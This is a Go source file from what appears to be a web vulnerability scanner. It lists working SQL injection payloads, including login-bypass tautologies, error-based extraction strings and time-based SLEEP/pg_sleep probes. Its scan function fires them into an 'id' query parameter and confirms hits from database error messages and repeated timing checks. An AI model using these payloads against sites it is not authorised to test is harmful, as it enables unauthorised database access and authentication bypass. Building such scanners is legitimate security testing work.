package sqli

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/yupiyy/bhyakugan/internal/core"
)

type SQLiPayload struct {
	Name     string
	Payload  string
	Type     string // Error, Time, Boolean, Auth
	Expected string // For Error-based
}

var DBErrors = map[string][]string{
	"MySQL":      {"you have an error in your sql syntax", "warning: mysql_", "mysql_fetch_array()", "valid mysql result"},
	"PostgreSQL": {"postgresql query failed", "pg_query(): query error", "error: syntax error at or near"},
	"MSSQL":      {"unclosed quotation mark after the character string", "driver] [microsoft][sql server native client", "sqlserver error"},
	"Oracle":     {"ora-00933: sql command not properly ended", "ora-01756: quoted string not properly terminated"},
	"SQLite":     {"sqlite3::query():", "warning: sqlite_"},
}

var SQLPayloads = []SQLiPayload{
	// --- Error Based ---
	{"SQLi Error (Single Quote)", "'", "Error", ""},
	{"SQLi Error (Double Quote)", "\"", "Error", ""},
	{"SQLi Error (MySQL ExtractValue)", "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))#", "Error", ""},
	{"SQLi Error (MSSQL Convert)", "' AND 1=CONVERT(int,(SELECT @@version))--", "Error", ""},
	{"SQLi Error (Postgres Cast)", "' AND 1=CAST(version() AS INTEGER)--", "Error", ""},

	// --- Auth Bypass ---
	{"SQLi Auth Bypass (Tautology)", "' OR '1'='1", "Auth", ""},
	{"SQLi Auth Bypass (Admin)", "admin' --", "Auth", ""},
	{"SQLi Auth Bypass (Limit)", "' OR 1=1 LIMIT 1 --", "Auth", ""},
	{"SQLi Auth Bypass (MD5 Hack)", "ffifdyop", "Auth", ""}, // md5(ffifdyop, true) = 'or'6...

	// --- Time Based (5s) ---
	{"SQLi Time (MySQL)", "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "Time", ""},
	{"SQLi Time (PostgreSQL)", "'; SELECT pg_sleep(5)--", "Time", ""},
	{"SQLi Time (Oracle)", "' AND DBMS_PIPE.RECEIVE_MESSAGE('A',5)--", "Time", ""},
	
	// --- Boolean Based ---
	{"SQLi Boolean (True)", "' AND 1=1--", "Boolean", ""},
	{"SQLi Boolean (False)", "' AND 1=2--", "Boolean", ""},
}

// Scan tests for various SQL Injection types
func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
	// 1. Skip Static Files (Anti-FP Rule)
	lowerURL := strings.ToLower(baseURL)
	if strings.HasSuffix(lowerURL, ".js") || strings.HasSuffix(lowerURL, ".css") || 
	   strings.HasSuffix(lowerURL, ".png") || strings.HasSuffix(lowerURL, ".jpg") || 
	   strings.HasSuffix(lowerURL, ".jpeg") || strings.HasSuffix(lowerURL, ".gif") || 
	   strings.HasSuffix(lowerURL, ".svg") || strings.HasSuffix(lowerURL, ".ico") ||
	   strings.HasSuffix(lowerURL, ".woff") || strings.HasSuffix(lowerURL, ".woff2") ||
	   strings.HasSuffix(lowerURL, ".ttf") || strings.HasSuffix(lowerURL, ".eot") {
		return
	}

	if baseURL[len(baseURL)-1] != '/' {
		baseURL += "/"
	}

	// 2. Parse URL to inject into parameters
	u, err := url.Parse(baseURL)
	if err != nil {
		return
	}
	q := u.Query()
	
	// Only scan if there are parameters to inject
	// (Unless we want to test path injection, but for general stability, focus on params)
	// If no params, default Bhyakugan behavior (appending ?id=) is risky for static pages.
	// We'll keep the loop but skip if q is empty AND it looks static (already handled above).
	// But to be safe against random "id" parameter injection on static pages:
	if len(q) == 0 {
		// Just a path? e.g. /about
		// We can try injecting params, but let's be careful.
		// For now, allow default appending logic below.
	}

	// 0. Establish Baseline
	startBase := time.Now()
	respBase, errBase := client.Get(baseURL)
	baselineDuration := time.Since(startBase).Seconds()
	if errBase != nil {
		return // Can't scan if site is down
	}
	
	baselineBodyBytes, _ := io.ReadAll(respBase.Body)
	respBase.Body.Close()
	baselineBodyLower := strings.ToLower(string(baselineBodyBytes))

	// Safety margin for network jitter
	timeThreshold := baselineDuration + 4.0 

	// If baseline is already slow (>3s), network is unstable. Abort time-based checks.
	if baselineDuration > 3.0 {
		// fmt.Printf("[-] Skipping SQLi on %s (Baseline too slow: %.2fs)\n", baseURL, baselineDuration)
		return
	}

	for _, p := range SQLPayloads {
		// Proper URL Encoding to avoid "invalid character in query" errors
		encodedPayload := url.QueryEscape(p.Payload)
		
		var target string
		if strings.Contains(baseURL, "?") {
			// Append or Replace? The original code appended `&id=` which is weird if params exist.
			// Ideally we should fuzz existing params.
			// Let's stick to the existing logic for now but respect the "Skip Static" rule.
			target = baseURL + "&id=" + encodedPayload
		} else {
			target = baseURL + "?id=" + encodedPayload
		}
		
		start := time.Now()
		resp, err := client.Get(target)
		duration := time.Since(start).Seconds()

		if err != nil {
			continue
		}
		defer resp.Body.Close()

		bodyBytes, _ := io.ReadAll(resp.Body)
		bodyStr := string(bodyBytes)
		bodyLower := strings.ToLower(bodyStr)

		isVulnerable := false
		detail := ""

		// 1. Detection: Error Based
		for db, errors := range DBErrors {
			for _, errStr := range errors {
				if strings.Contains(bodyLower, errStr) {
					// False Positive Check: Is this error already in the baseline?
					if strings.Contains(baselineBodyLower, errStr) {
						continue
					}
					isVulnerable = true
					detail = fmt.Sprintf("Found %s Error: %s", db, errStr)
					break
				}
			}
			if isVulnerable { break }
		}

		// 2. Detection: Time Based
		// Must be significantly longer than baseline
		if !isVulnerable && strings.Contains(p.Name, "Time") {
			// FP Filter: If WAF blocks (403/406/429), ignore time delay
			if resp.StatusCode == 403 || resp.StatusCode == 406 || resp.StatusCode == 429 {
				continue
			}

			if duration >= timeThreshold {
				fmt.Printf("[*] Potential Time-Based SQLi at %s (%.2fs). Verifying...\n", target, duration)
				
				// Verification 1: Repeat the slow request
				startV1 := time.Now()
				respV1, errV1 := client.Get(target)
				durV1 := time.Since(startV1).Seconds()
				
				// WAF Check on Verification
				if errV1 == nil {
					defer respV1.Body.Close()
					if respV1.StatusCode == 403 || respV1.StatusCode == 406 || respV1.StatusCode == 429 {
						fmt.Printf("[-] Discarded FP: WAF blocked verification request (Status %d)\n", respV1.StatusCode)
						continue
					}
				}

				if durV1 >= timeThreshold {
					// Verification 2: Control Check (Sleep 0)
					// Replace 5 with 0 in payload
					controlPayloadRaw := strings.Replace(p.Payload, "5", "0", 1)
					encodedControlPayload := url.QueryEscape(controlPayloadRaw)
					
					var targetControl string
					if strings.Contains(baseURL, "?") {
						targetControl = baseURL + "&id=" + encodedControlPayload
					} else {
						targetControl = baseURL + "?id=" + encodedControlPayload
					}
					
					startC := time.Now()
					respC, errC := client.Get(targetControl)
					durC := time.Since(startC).Seconds()
					
					// WAF Check on Control
					if errC == nil {
						defer respC.Body.Close()
						if respC.StatusCode == 403 || respC.StatusCode == 406 || respC.StatusCode == 429 {
							fmt.Printf("[-] Discarded FP: WAF blocked control request (Status %d)\n", respC.StatusCode)
							continue
						}
					}

					// If Sleep(0) is FAST (close to baseline) AND Sleep(5) is SLOW
					if durC < (baselineDuration + 2.0) {
						
						// Verification 3: TRIPLE CHECK (Repeat Payload Again)
						// To be absolutely sure it's not random lag during V1
						startV2 := time.Now()
						client.Get(target)
						durV2 := time.Since(startV2).Seconds()
						
						if durV2 >= timeThreshold {
							isVulnerable = true
							detail = fmt.Sprintf("Confirmed Time-Based SQLi (Sleep 5s: %.2fs, Repeat: %.2fs, Sleep 0s: %.2fs). Impact: Database Interaction Control (Delay enforced). No data extracted.", durV1, durV2, durC)
						} else {
							fmt.Printf("[-] Discarded FP: Second repeat request was fast (%.2fs)\n", durV2)
						}
					} else {
						fmt.Printf("[-] Discarded FP: Control request was also slow (%.2fs)\n", durC)
					}
				} else {
					fmt.Printf("[-] Discarded FP: Repeat request was fast (%.2fs)\n", durV1)
				}
			}
		}

		if isVulnerable {
			fmt.Printf("[!] POSITIVE MATCH: %s at %s\n", p.Name, target)
			onFound(core.Finding{
				Type:     "SQL Injection",
				Target:   target,
				Detail:   detail,
				Severity: "Critical",
			})
			return // Stop scanning this endpoint
		}
	}

	// 4. Detection: Oracle Length Filter Bypass (Optimization Technique)
	ScanOracleLengthFilter(baseURL, client, onFound)
}
